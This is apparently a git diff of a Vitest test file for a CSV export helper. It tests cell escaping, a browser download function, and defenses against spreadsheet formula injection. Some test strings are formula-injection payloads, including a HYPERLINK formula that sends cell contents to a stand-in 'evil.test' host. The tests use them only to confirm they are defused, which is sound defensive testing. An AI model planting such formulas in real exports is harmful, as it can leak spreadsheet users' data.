@@ -1,57 +1,68 @@
-import { describe, expect, it } from 'vitest';
+import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';
 
-import { toCsv } from './csv.ts';
+import { downloadCsv, toCsv } from './csv.ts';
 
 describe('toCsv', () => {
-  it('joins headers and rows with commas and newlines', () => {
-    const csv = toCsv(
-      ['a', 'b'],
-      [
-        [1, 2],
-        [3, 4],
-      ],
+  it('joins headers and rows with escaped cells', () => {
+    expect(
+      toCsv(
+        ['name', 'email'],
+        [
+          ['Ada', 'ada@example.com'],
+          ['Grace', 'grace@example.com'],
+        ],
+      ),
+    ).toBe('name,email\nAda,ada@example.com\nGrace,grace@example.com');
+  });
+
+  it('stringifies null, numbers, booleans, and objects', () => {
+    expect(toCsv(['a', 'b', 'c', 'd'], [[null, 42, true, { x: 1 }]])).toBe(
+      'a,b,c,d\n,42,true,"{""x"":1}"',
     );
-    expect(csv).toBe('a,b\n1,2\n3,4');
   });
 
-  it('escapes fields containing commas, quotes, or newlines', () => {
-    const csv = toCsv(['name'], [['Doe, John'], ['say "hi"'], ['line1\nline2']]);
-    expect(csv).toBe('name\n"Doe, John"\n"say ""hi"""\n"line1\nline2"');
+  it('quotes fields containing commas, quotes, or newlines and doubles quotes', () => {
+    expect(toCsv(['v'], [['a,b']])).toBe('v\n"a,b"');
+    expect(toCsv(['v'], [['say "hi"']])).toBe('v\n"say ""hi"""');
+    expect(toCsv(['v'], [['line1\nline2']])).toBe('v\n"line1\nline2"');
   });
 
-  it('renders null/undefined as empty cells', () => {
-    expect(toCsv(['x'], [[null], [undefined]])).toBe('x\n\n');
-  });
-
-  it('serializes number, boolean, and bigint cells as plain values', () => {
-    // Exercises the typeof number/boolean/bigint branch (a bigint would throw
-    // under JSON.stringify, so this also pins the String() coercion).
-    expect(toCsv(['n', 'b', 'big'], [[42, true, 10n]])).toBe('n,b,big\n42,true,10');
-  });
-
-  it('serializes an object cell as quoted JSON (the non-primitive branch)', () => {
-    expect(toCsv(['x'], [[{ a: 1 }]])).toBe('x\n"{""a"":1}"');
-  });
-
-  it('neutralizes formula-injection triggers (=, +, -, @) with a leading quote', () => {
-    const csv = toCsv(
-      ['name'],
-      [['=1+1'], ['+ping'], ['-2+3'], ['@SUM(A1)'], ['safe name']],
+  it('neutralizes formula-injection prefixes with a leading apostrophe', () => {
+    expect(toCsv(['v'], [['=HYPERLINK("http://evil")']])).toBe(
+      'v\n"\'=HYPERLINK(""http://evil"")"',
     );
-    expect(csv).toBe("name\n'=1+1\n'+ping\n'-2+3\n'@SUM(A1)\nsafe name");
+    expect(toCsv(['v'], [['+1']])).toBe("v\n'+1");
+    expect(toCsv(['v'], [['-2']])).toBe("v\n'-2");
+    expect(toCsv(['v'], [['@cmd']])).toBe("v\n'@cmd");
+    // A plain negative-looking name is still readable text, not a formula.
+    expect(toCsv(['v'], [['safe']])).toBe('v\nsafe');
+  });
+});
+
+describe('downloadCsv', () => {
+  const createObjectURL = vi.fn(() => 'blob:csv');
+  const revokeObjectURL = vi.fn();
+  const anchorClick = vi
+    .spyOn(HTMLAnchorElement.prototype, 'click')
+    .mockImplementation(() => undefined);
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    URL.createObjectURL = createObjectURL;
+    URL.revokeObjectURL = revokeObjectURL;
   });
 
-  it('neutralizes a formula that ALSO needs quoting (HYPERLINK exfil)', () => {
-    // A malicious member display name: must be both formula-defused and
-    // CSV-quoted (it contains commas + quotes).
-    const evil = '=HYPERLINK("http://evil.test?x="&A1,"click")';
-    const csv = toCsv(['name'], [[evil]]);
-    expect(csv).toBe(`name\n"'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"`);
+  afterAll(() => {
+    anchorClick.mockRestore();
   });
 
-  it('neutralizes a leading tab / carriage-return trigger', () => {
-    // Tab/CR aren't quote-triggers, so the field stays unquoted — but the
-    // apostrophe still defuses the formula.
-    expect(toCsv(['x'], [['\t=cmd'], ['\r=cmd']])).toBe("x\n'\t=cmd\n'\r=cmd");
+  it('creates a blob link, clicks it, and cleans everything up', () => {
+    downloadCsv('members.csv', 'a,b\n1,2');
+
+    expect(createObjectURL).toHaveBeenCalledTimes(1);
+    expect(anchorClick).toHaveBeenCalledTimes(1);
+    expect(revokeObjectURL).toHaveBeenCalledWith('blob:csv');
+    // The temporary anchor never leaks into the document.
+    expect(document.querySelector('a[download="members.csv"]')).toBeNull();
   });
 });
